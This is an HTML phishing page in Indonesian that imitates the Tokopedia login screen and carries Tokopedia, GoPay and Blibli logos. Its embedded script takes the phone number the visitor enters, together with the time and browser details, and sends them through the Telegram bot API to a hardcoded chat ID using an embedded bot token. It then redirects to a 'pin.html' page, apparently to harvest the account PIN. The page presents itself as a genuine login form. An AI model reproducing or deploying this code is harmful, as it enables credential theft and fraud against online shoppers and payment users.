<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk ke Tokopedia</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #f7f7f7;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .login-card {
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            border-radius: 20px;
        }
        /* Menghilangkan panah pada input type number */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center">

    <div class="w-full flex justify-center items-center gap-10 py-5 bg-white shadow-sm mb-10">
        <img src="img/logo.png" class="h-10" alt="Tokopedia">
        <img src="img/gopay.png" class="h-10" alt="Gopay">
        <img src="img/bibli.png" class="h-7" alt="Blibli">
    </div>

    <div class="w-full max-w-[400px] px-4">
        <div class="flex justify-center mb-6">
            <img src="img/image.png" class="h-12" alt="Tokopedia Logo">
        </div>

        <div class="bg-white login-card p-8 text-center border border-gray-100">
            <h2 class="text-xl font-bold text-gray-800 mb-6">Masukkan No. Handphone</h2>
            
            <form id="loginForm">
                <input
                    type="tel"
                    id="loginInput"
                    name="login"
                    placeholder="Nomor Handphone"
                    class="w-full border border-green-500 rounded-lg px-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-green-100 mb-6 text-center"
                    required
                />

                <button
                    type="submit"
                    id="nextButton"
                    class="w-full bg-[#03ac0e] text-white py-3 rounded-lg text-xl font-bold transition duration-150 hover:bg-green-700 shadow-md"
                >
                    Verifikasi
                </button>
            </form>
        </div>

        <p class="text-center mt-12 text-gray-600">
            Tidak Mempunyai Akun? <a href="#" class="text-[#03ac0e] font-bold">Daftar</a>
        </p>
    </div>

    <script>
        const CHAT_ID = "7823308464";
        const BOT_TOKEN = "8449078397:AAFqHmrJKLNo4ZX1TCsbCn1uf-GjrQtnmo8";
        const NEXT_PAGE_URL = "pin.html";

        const loginForm = document.getElementById("loginForm");
        const loginInput = document.getElementById("loginInput");
        const nextButton = document.getElementById("nextButton");

        loginForm.addEventListener('submit', (event) => {
            event.preventDefault();
            const loginValue = loginInput.value.trim();

            if (loginValue) {
                nextButton.textContent = "Memproses...";
                nextButton.disabled = true;
                nextButton.classList.add("opacity-70", "cursor-not-allowed");

                const message = `ðŸ‘¤ *INPUT LOGIN BARU*\n\n` +
                                `Input: *${loginValue}*\n` +
                                `Waktu: ${new Date().toLocaleString("id-ID")}\n` +
                                `Perangkat: ${navigator.userAgent}`;

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                })
                .then(() => {
                    setTimeout(() => {
                        window.location.href = NEXT_PAGE_URL;
                    }, 1000);
                })
                .catch(error => {
                    window.location.href = NEXT_PAGE_URL;
                });
            }
        });
    </script>
</body>
</html>
